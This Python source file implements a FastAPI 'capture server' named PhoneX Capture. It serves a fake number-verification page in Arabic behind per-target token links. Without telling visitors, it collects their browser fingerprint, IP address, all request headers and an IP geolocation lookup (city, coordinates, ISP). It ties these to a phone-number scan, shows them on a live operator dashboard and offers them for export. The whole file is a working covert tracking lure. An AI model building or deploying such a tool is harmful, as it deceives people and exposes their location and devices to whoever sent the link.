"""FastAPI capture server: landing page, fingerprint collector, live dashboard."""

from __future__ import annotations

import asyncio
import json
from pathlib import Path
from typing import Any

import httpx
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from ..config import Config
from ..storage import Storage
from ..utils import client_ip, new_id, now_iso

BASE_DIR = Path(__file__).resolve().parent
TEMPLATES = Jinja2Templates(directory=str(BASE_DIR / "templates"))

SUBSCRIBERS: set[asyncio.Queue] = set()

def broadcast(event: dict[str, Any]) -> None:
    payload = json.dumps(event, ensure_ascii=False, default=str)
    for queue in list(SUBSCRIBERS):
        try:
            queue.put_nowait(payload)
        except asyncio.QueueFull:
            pass

async def ip_geo(ip: str) -> dict[str, Any]:
    if not ip or ip.startswith(("127.", "10.", "192.168.", "172.16.", "::1")):
        return {}
    url = f"http://ip-api.com/json/{ip}"
    params = {"fields": "status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query"}
    try:
        async with httpx.AsyncClient(timeout=8.0) as client:
            response = await client.get(url, params=params)
            data = response.json()
            return data if data.get("status") == "success" else {}
    except Exception:
        return {}

def create_app(config: Config, storage: Storage) -> FastAPI:
    app = FastAPI(title="PhoneX Capture", docs_url="/api/docs", redoc_url=None)
    app.mount("/static", StaticFiles(directory=str(BASE_DIR / "static")), name="static")

    def base_url(request: Request) -> str:
        if config.public_url:
            return config.public_url.rstrip("/")
        return str(request.base_url).rstrip("/")

    @app.get("/", response_class=HTMLResponse)
    async def index(request: Request) -> HTMLResponse:
        return TEMPLATES.TemplateResponse(
            "index.html",
            {"request": request, "token": "", "title": "تحقّق سريع", "base": base_url(request)},
        )

    @app.get("/c/{token}", response_class=HTMLResponse)
    async def capture_page(request: Request, token: str) -> HTMLResponse:
        scan = storage.get_scan_by_token(token)
        title = "تحقّق من رقمك"
        if scan is not None and scan["e164"]:
            title = f"تحقّق — {scan['e164']}"
        return TEMPLATES.TemplateResponse(
            "index.html",
            {"request": request, "token": token, "title": title, "base": base_url(request)},
        )

    @app.get("/d/{token}", response_class=HTMLResponse)
    async def dashboard(request: Request, token: str) -> HTMLResponse:
        scan = storage.get_scan_by_token(token)
        if scan is None:
            raise HTTPException(status_code=404, detail="unknown token")
        return TEMPLATES.TemplateResponse(
            "dashboard.html",
            {"request": request, "token": token, "scan": dict(scan)},
        )

    @app.get("/api/ip")
    async def api_ip(request: Request) -> JSONResponse:
        ip = client_ip(dict(request.headers), request.client.host if request.client else "")
        geo = await ip_geo(ip)
        return JSONResponse({"ip": ip, "geo": geo})

    @app.post("/api/collect")
    async def collect(request: Request) -> JSONResponse:
        try:
            body = await request.json()
        except ValueError:
            raise HTTPException(status_code=400, detail="invalid json")
        if not isinstance(body, dict):
            raise HTTPException(status_code=400, detail="invalid payload")

        token = str(body.get("token") or "")
        scan = storage.get_scan_by_token(token) if token else None
        scan_id = scan["id"] if scan is not None else ""

        ip = client_ip(dict(request.headers), request.client.host if request.client else "")
        geo = await ip_geo(ip)
        ua = request.headers.get("user-agent", "")
        device_id = new_id("dv_")
        body["server"] = {
            "ip": ip,
            "ip_geo": geo,
            "headers": {k.lower(): v for k, v in request.headers.items()},
            "received_at": now_iso(),
        }
        storage.add_device(device_id, token, scan_id, ip, geo, ua, body)
        storage.add_event("device", {"device_id": device_id, "token": token, "ip": ip, "ua": ua})
        broadcast({"kind": "device", "device_id": device_id, "token": token, "ip": ip, "ua": ua, "at": now_iso()})
        return JSONResponse({"ok": True, "device_id": device_id})

    @app.get("/api/devices/{token}")
    async def api_devices(token: str) -> JSONResponse:
        return JSONResponse({"devices": storage.get_devices(token)})

    @app.get("/api/stream")
    async def stream(request: Request) -> StreamingResponse:
        queue: asyncio.Queue = asyncio.Queue(maxsize=200)
        SUBSCRIBERS.add(queue)

        async def generator():
            try:
                yield "retry: 3000\n\n"
                while True:
                    if await request.is_disconnected():
                        break
                    try:
                        payload = await asyncio.wait_for(queue.get(), timeout=15.0)
                        yield f"data: {payload}\n\n"
                    except asyncio.TimeoutError:
                        yield ": ping\n\n"
            finally:
                SUBSCRIBERS.discard(queue)

        return StreamingResponse(
            generator(),
            media_type="text/event-stream",
            headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
        )

    @app.get("/api/export/{token}")
    async def export(token: str) -> JSONResponse:
        scan = storage.get_scan_by_token(token)
        if scan is None:
            raise HTTPException(status_code=404, detail="unknown token")
        return JSONResponse(
            {
                "scan": dict(scan),
                "devices": storage.get_devices(token),
                "events": storage.recent_events(200),
            }
        )

    @app.get("/healthz", response_class=PlainTextResponse)
    async def healthz() -> str:
        return "ok"

    return app